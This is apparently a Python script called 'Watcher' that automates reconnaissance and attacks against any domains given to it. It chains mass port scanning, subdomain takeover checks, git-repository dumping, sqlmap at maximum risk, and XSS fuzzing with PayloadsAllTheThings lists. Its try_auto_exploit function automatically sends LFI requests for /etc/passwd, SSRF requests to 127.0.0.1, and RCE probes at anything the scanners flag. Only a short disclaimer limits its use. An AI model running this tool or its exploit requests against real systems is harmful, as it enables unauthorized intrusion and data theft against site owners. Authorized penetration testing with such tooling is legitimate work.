#!/usr/bin/env python3
# Author: Bl4ckC3llSec / Cxb3rF1lthSec
# Watcher - The Ultimate Automated Recon & Vulnerability Orchestrator

"""
DISCLAIMER:
For authorized, legal testing only. You are responsible for your own actions.
This tool launches intrusive attacks. Get permission.
"""

import os, sys, subprocess, threading, zipfile, time, json, shutil, re
from pathlib import Path
from datetime import datetime
from collections import defaultdict

import argparse
import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich import box

console = Console()
WARNINGS = []
HOME = Path.home()
TOOLS_DIR = HOME / ".recon_tools"
RESULTS_DIR = HOME / "recon_results"
PYTHON_VENV = TOOLS_DIR / ".venv"
PAAT_ZIP = HOME / "PayloadsAllTheThings-master.zip"
PAAT_DIR = HOME / "PayloadsAllTheThings-master"
SECLISTS = Path("/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt")
NUCLEI_TEMPLATES = HOME / "nuclei-templates"
NUCLEI_COMMUNITY = HOME / "nuclei-community-templates"
ARJUN = str(HOME / "Arjun/arjun.py")
WEBHOOK_URL = ""  # Set Discord/Slack/webhook for reporting (optional)

TOOLS = [
    "amass", "naabu", "nuclei", "ffuf", "nikto", "wpscan", "pandoc", "sslyze",
    "dalfox", "subzy", "xsstrike", "sqlmap", "httpx", "masscan", "aquatone", "eyewitness",
    "gf", "gitdumper", "gitextractor", "subfinder", "assetfinder", "waybackurls", "paramspider",
    "kiterunner"
]
PYTHON_PIPS = ["requests", "bs4"]
GOTOOLS = ["dalfox", "subzy", "gf", "subfinder", "assetfinder", "waybackurls", "kiterunner", "httpx"]

BANNER = r"""[bold blue]
 __      __         __         .__
/  \    /  \_____ _/  |_  ____ |  |__   ___________
\   \/\/   /\__  \\   __\/ ___\|  |  \_/ __ \_  __ \
 \        /  / __ \|  | \  \___|   Y  \  ___/|  | \/
  \__/\  /  (____  /__|  \___  >___|  /\___  >__|
       \/        \/          \/     \/     \/
[bold cyan]Author:[/bold cyan] Bl4ckC3llSec / Cxb3rF1lthSec

[bold red]DISCLAIMER:[/bold red]
[white]For authorized, legal testing only! The author is not responsible for misuse.[/white]
[/bold blue]
"""

def print_banner():
    console.print(BANNER)

def check_tool(tool):
    return shutil.which(tool) is not None

def ensure_dir(d):
    Path(d).mkdir(parents=True, exist_ok=True)

def run_cmd(cmd, out_file=None, timeout=1200, live=True):
    try:
        console.print(f"[bold blue][cmd] {cmd}[/bold blue]")
        if out_file:
            with open(out_file, "w") as outf:
                proc = subprocess.Popen(cmd, shell=True, stdout=outf, stderr=subprocess.STDOUT)
                proc.communicate(timeout=timeout)
        else:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            if live:
                for line in proc.stdout:
                    line_str = line.decode(errors="ignore")
                    console.print(f"[cyan]{line_str.rstrip()}[/cyan]")
            else:
                proc.communicate(timeout=timeout)
    except Exception as e:
        WARNINGS.append(f"Error running: {cmd}\n  ({e})")

def ensure_python_pips():
    import importlib
    for pkg in PYTHON_PIPS:
        try:
            importlib.import_module(pkg)
        except ImportError:
            console.print(f"[yellow][*] Installing {pkg}...[/yellow]")
            run_cmd(f"{sys.executable} -m pip install {pkg}")

def install_tool(tool):
    if check_tool(tool): return
    console.print(f"[yellow][*] Attempting install for {tool}...[/yellow]")
    if tool == "wpscan":
        run_cmd("sudo gem install wpscan")
    elif tool == "pandoc":
        run_cmd("sudo pacman -S --noconfirm pandoc-cli || sudo apt install -y pandoc || true")
    elif tool == "gf":
        run_cmd("sudo pacman -S --noconfirm go || sudo apt install -y golang-go || true")
        run_cmd("go install github.com/tomnomnom/gf@latest")
        if not check_tool("gf"):
            run_cmd("git clone https://github.com/tomnomnom/gf.git ~/gf")
            run_cmd("cd ~/gf && go mod init && go build")
            run_cmd("sudo cp ~/gf/gf /usr/local/bin/")
        if not check_tool("gf"):
            WARNINGS.append(
                "[!] Could not auto-install 'gf'. Try manually:\n"
                "    git clone https://github.com/tomnomnom/gf.git && cd gf && go mod init && go build && sudo cp gf /usr/local/bin/"
            )
    elif tool == "kiterunner":
        run_cmd("sudo pacman -S --noconfirm go || sudo apt install -y golang-go || true")
        run_cmd("go install github.com/projectdiscovery/kiterunner/cmd/kiterunner@latest")
        if not check_tool("kiterunner"):
            WARNINGS.append(
                "[!] Could not auto-install 'kiterunner'. Try manually:\n"
                "    git clone https://github.com/projectdiscovery/kiterunner.git && cd kiterunner && go mod tidy && go build -o kiterunner ./cmd/kiterunner && sudo cp kiterunner /usr/local/bin/"
            )
    elif tool == "paramspider":
        run_cmd("git clone https://github.com/devanshbatham/ParamSpider.git ~/ParamSpider")
        run_cmd("pip install ~/ParamSpider || pip3 install ~/ParamSpider")
        if not check_tool("paramspider"):
            WARNINGS.append(
                "[!] Could not auto-install 'paramspider'. Try manually:\n"
                "    git clone https://github.com/devanshbatham/ParamSpider.git && cd ParamSpider && pip install ."
            )
    elif tool == "gitdumper" or tool == "gitextractor":
        if not (HOME / "GitTools").exists():
            run_cmd(f"git clone https://github.com/internetwache/GitTools.git {HOME}/GitTools")
        if not check_tool("gitdumper"):
            WARNINGS.append(
                "[!] Could not auto-install 'gitdumper'. Try manually:\n"
                "    git clone https://github.com/internetwache/GitTools.git"
            )
    else:
        run_cmd(f"sudo pacman -S --noconfirm {tool} || sudo apt install -y {tool} || true")
        if not check_tool(tool):
            WARNINGS.append(
                f"[!] Could not auto-install: {tool}. Try manually: sudo pacman -S {tool} || sudo apt install {tool}"
            )

def auto_install_all_tools():
    ensure_python_pips()
    for t in TOOLS:
        install_tool(t)

def ensure_wordlists():
    if not SECLISTS.exists():
        console.print("[yellow][*] Installing SecLists...[/yellow]")
        run_cmd("sudo pacman -S --noconfirm seclists || sudo apt install -y seclists || true")
    return SECLISTS

def ensure_nuclei_templates():
    if not NUCLEI_TEMPLATES.exists():
        console.print("[yellow][*] Downloading nuclei-templates...[/yellow]")
        run_cmd(f"git clone https://github.com/projectdiscovery/nuclei-templates.git {NUCLEI_TEMPLATES}")
    else:
        run_cmd(f"cd {NUCLEI_TEMPLATES} && git pull")
    if not NUCLEI_COMMUNITY.exists():
        run_cmd(f"git clone https://github.com/projectdiscovery/nuclei-community-templates.git {NUCLEI_COMMUNITY}")
    else:
        run_cmd(f"cd {NUCLEI_COMMUNITY} && git pull")

def extract_paat():
    if not PAAT_DIR.exists():
        console.print(f"[yellow][*] Extracting {PAAT_ZIP}...[/yellow]")
        try:
            with zipfile.ZipFile(PAAT_ZIP, "r") as z:
                z.extractall(HOME)
        except Exception as e:
            WARNINGS.append(f"Could not extract PAAT zip: {e}")

def find_paat_payloads():
    xss_files, sqli_files, lfi_files, ssrf_files, rce_files = [], [], [], [], []
    for root, _, files in os.walk(PAAT_DIR):
        for f in files:
            if f.lower().endswith(('.txt', '.payloads')):
                path = os.path.join(root, f)
                fname = path.lower()
                if "xss" in fname: xss_files.append(path)
                if "sqli" in fname or "sql_injection" in fname: sqli_files.append(path)
                if "lfi" in fname: lfi_files.append(path)
                if "ssrf" in fname: ssrf_files.append(path)
                if "rce" in fname or "remote_code" in fname: rce_files.append(path)
    return xss_files, sqli_files, lfi_files, ssrf_files, rce_files

def send_notification(title, msg):
    if not WEBHOOK_URL: return
    data = {"content": f"**{title}**\n{msg}"}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except Exception:
        pass

def try_auto_exploit(target, outdir, findings_file):
    if not os.path.exists(findings_file): return
    with open(findings_file) as f:
        lines = f.readlines()
    pocs_run = []
    for l in lines:
        if "rce" in l.lower():
            run_cmd(f"curl -s '{l.strip()}'", out_file=f"{outdir}/auto_rce_poc.txt", live=True)
            pocs_run.append("RCE PoC")
        elif "lfi" in l.lower():
            run_cmd(f"curl -s '{l.strip()}?file=../../../../etc/passwd'", out_file=f"{outdir}/auto_lfi_poc.txt", live=True)
            pocs_run.append("LFI PoC")
        elif "ssrf" in l.lower():
            run_cmd(f"curl -s '{l.strip()}?url=http://127.0.0.1:80'", out_file=f"{outdir}/auto_ssrf_poc.txt", live=True)
            pocs_run.append("SSRF PoC")
    return pocs_run

def run_all_recon(target, outdir, wordlist, xss_files, sqli_files, lfi_files, ssrf_files, rce_files, live=True):
    summary = []
    baseurl = f"https://{target}"

    # Subdomain enum & takeover
    run_cmd(f"amass enum -d {target} -o {outdir}/amass_subs.txt -passive", live=live)
    run_cmd(f"subfinder -d {target} -o {outdir}/subfinder.txt", live=live)
    run_cmd(f"assetfinder --subs-only {target} > {outdir}/assetfinder.txt", live=live)
    run_cmd(f"subzy -targets {outdir}/amass_subs.txt -o {outdir}/subzy.txt", live=live)

    # Masscan/Naabu/httpx
    run_cmd(f"masscan -p1-65535 {target} --rate 10000 -oL {outdir}/masscan.txt", live=live)
    run_cmd(f"naabu -host {target} -top-ports 100 -o {outdir}/naabu.txt", live=live)
    run_cmd(f"httpx -l {outdir}/amass_subs.txt -o {outdir}/httpx.txt -json -threads 100 -silent", live=live)

    # Param & wordlist discovery
    run_cmd(f"waybackurls {target} > {outdir}/waybackurls.txt", live=live)
    run_cmd(f"paramspider -d {target} -o {outdir}/paramspider.txt", live=live)
    run_cmd(f"python3 {ARJUN} -u '{baseurl}' --get --json --output {outdir}/arjun.json", live=live)
    for pattern in ["lfi", "ssrf", "sqli", "rce"]:
        run_cmd(f"gf {pattern} {outdir}/waybackurls.txt > {outdir}/gf_{pattern}.txt", live=live)

    # GitTools, screenshots
    run_cmd(f"{HOME}/GitTools/Dumper/gitdumper.sh https://{target}/.git {outdir}/gitdump", live=live)
    run_cmd(f"cat {outdir}/httpx.txt | aquatone -out {outdir}/aquatone/", live=live)
    run_cmd(f"eyewitness --web -f {outdir}/httpx.txt -d {outdir}/eyewitness --no-prompt", live=live)

    # VULN SCANNING (Nuclei, plus custom PoC)
    nuclei_main = f"nuclei -l {outdir}/httpx.txt -o {outdir}/nuclei.txt -t {NUCLEI_TEMPLATES} -t {NUCLEI_COMMUNITY} --stats --stats-interval 10"
    nuclei_poc = f"nuclei -l {outdir}/httpx.txt -o {outdir}/nuclei_poc.txt -t {NUCLEI_TEMPLATES}/exposures/ --stats --stats-interval 10"
    run_cmd(nuclei_main, live=live)
    run_cmd(nuclei_poc, live=live)

    # FFUF/Nikto/Dalfox/XSStrike/SQLMap
    run_cmd(f"ffuf -w {wordlist} -u {baseurl}/FUZZ -of html -o {outdir}/ffuf_dirs.html -t 50 -mc all", live=live)
    run_cmd(f"nikto -h {baseurl} -output {outdir}/nikto.txt", live=live)
    run_cmd(f"dalfox url '{baseurl}' --custom-payload {xss_files[0] if xss_files else '/dev/null'} -o {outdir}/dalfox.txt", live=live)
    run_cmd(f"xsstrike -u '{baseurl}' --fuzzer --payloads {xss_files[0] if xss_files else '/dev/null'} --json-output {outdir}/xsstrike.json", live=live)
    run_cmd(f"sqlmap -u '{baseurl}' --batch --level=3 --risk=3 -o --output-dir={outdir}/sqlmap", live=live)
    run_cmd(f"sslyze {target} > {outdir}/sslyze.txt", live=live)
    run_cmd(f"wpscan --url {baseurl} --no-update --disable-tls-checks --random-user-agent -o {outdir}/wpscan.txt", live=live)
    run_cmd(f"kiterunner wordlist {wordlist} -u {baseurl} -o {outdir}/kiterunner.txt", live=live)

    # Extra: GF, PoCs
    for files, label in [(xss_files, "xss"), (sqli_files, "sqli"), (lfi_files, "lfi"), (ssrf_files, "ssrf"), (rce_files, "rce")]:
        if files:
            run_cmd(f"cat {outdir}/waybackurls.txt | ffuf -w {files[0]}:FUZZ -u {baseurl}?FUZZ=test -mc all -of html -o {outdir}/ffuf_{label}.html -t 20", live=live)

    pocs_run = try_auto_exploit(target, outdir, f"{outdir}/nuclei.txt")

    txt_report = f"{outdir}/report.txt"
    html_report = f"{outdir}/report.html"
    with open(txt_report, "w") as rep:
        rep.write(f"Recon Report for {target}\n\n==== Key Outputs ====\n")
        for f in Path(outdir).glob("*.*"):
            if f.name.startswith("report."): continue
            rep.write(f"\n==== {f.name} ====\n")
            try:
                with open(f) as content:
                    rep.writelines(content.readlines()[:80])
            except Exception:
                rep.write("[unreadable file]\n")
        if pocs_run:
            rep.write("\n==== Auto Exploit/PoCs Run ====\n")
            for p in pocs_run:
                rep.write(f"  - {p}\n")
    run_cmd(f"pandoc {txt_report} -o {html_report}")
    send_notification("Scan Complete", f"Target {target} completed. See {outdir}")

    return txt_report, html_report

def menu():
    table = Table(box=box.DOUBLE_EDGE, title="[bold cyan]Watcher[/bold cyan]")
    table.add_column("[bold blue]Option[/bold blue]", style="bold cyan", width=5)
    table.add_column("[bold green]Action[/bold green]")
    table.add_row("[bold]1[/bold]", "Start new scan")
    table.add_row("[bold]2[/bold]", "Check dependencies & install")
    table.add_row("[bold]3[/bold]", "Show installed tools")
    table.add_row("[bold]4[/bold]", "Show warnings/errors")
    table.add_row("[bold]5[/bold]", "Exit")
    console.print(table)
    return Prompt.ask("\n[bold green]Select option[/bold green]", choices=["1", "2", "3", "4", "5"])

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="Watcher | By Bl4ckC3llSec / Cxb3rF1lthSec")
    parser.add_argument("targets", nargs="*", help="Target domains or file (one per line)")
    parser.add_argument("--threads", type=int, default=2, help="Parallel scan threads")
    parser.add_argument("--menu", action="store_true", help="Show menu (default if no args)")
    args = parser.parse_args()
    if not (args.targets or args.menu):
        args.menu = True
    ensure_dir(TOOLS_DIR)
    ensure_dir(RESULTS_DIR)
    ensure_python_pips()

    while args.menu:
        opt = menu()
        if opt == "1":
            args.menu = False
            break
        elif opt == "2":
            auto_install_all_tools()
            ensure_wordlists()
            extract_paat()
            ensure_nuclei_templates()
            console.print("[bold green]All dependencies checked.[/bold green]")
        elif opt == "3":
            t = Table(title="Installed Recon Tools", box=box.MINIMAL_DOUBLE_HEAD)
            t.add_column("Tool", style="bold cyan")
            t.add_column("Available?", style="green")
            for tool in TOOLS:
                t.add_row(tool, "[green]Yes[/green]" if check_tool(tool) else "[red]No[/red]")
            console.print(t)
        elif opt == "4":
            if WARNINGS:
                for w in WARNINGS:
                    console.print(f"[yellow]{w}[/yellow]")
            else:
                console.print("[green]No warnings yet![/green]")
        elif opt == "5":
            console.print("[bold cyan]Bye![/bold cyan]")
            sys.exit(0)

    auto_install_all_tools()
    wordlist = ensure_wordlists()
    extract_paat()
    ensure_nuclei_templates()
    xss_files, sqli_files, lfi_files, ssrf_files, rce_files = find_paat_payloads()

    if len(args.targets) == 1 and os.path.isfile(args.targets[0]):
        with open(args.targets[0]) as f:
            targets = [line.strip() for line in f if line.strip()]
    elif args.targets:
        targets = [t.strip() for t in args.targets if t.strip()]
    else:
        targets = console.input("[yellow][*] Enter targets (comma/space): [/yellow]").replace(",", " ").split()
        targets = [t.strip() for t in targets if t.strip()]
    dt = datetime.now().strftime("%Y%m%d_%H%M%S")
    results = []
    with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn()) as progress:
        task = progress.add_task("[green]Scanning...", total=len(targets))
        for target in targets:
            outdir = RESULTS_DIR / f"{target}-{dt}"
            ensure_dir(outdir)
            txt_report, html_report = run_all_recon(
                target, outdir, wordlist, xss_files, sqli_files, lfi_files, ssrf_files, rce_files,
                live=True
            )
            results.append((target, txt_report, html_report))
            progress.advance(task)
    # Reporting Table
    t = Table(title="[bold green]SCAN REPORTS[/bold green]", show_lines=True, box=box.ROUNDED)
    t.add_column("Target", style="bold magenta")
    t.add_column("Text Report", style="bold cyan")
    t.add_column("HTML Report", style="bold green")
    for r in results:
        t.add_row(r[0], r[1], r[2])
    console.print(Panel.fit(t, title="[bold blue]All Results[/bold blue]"))
    console.print(f"\n[bold green][!] All scans complete! Reports in {RESULTS_DIR}[/bold green]\n")

if __name__ == "__main__":
    main()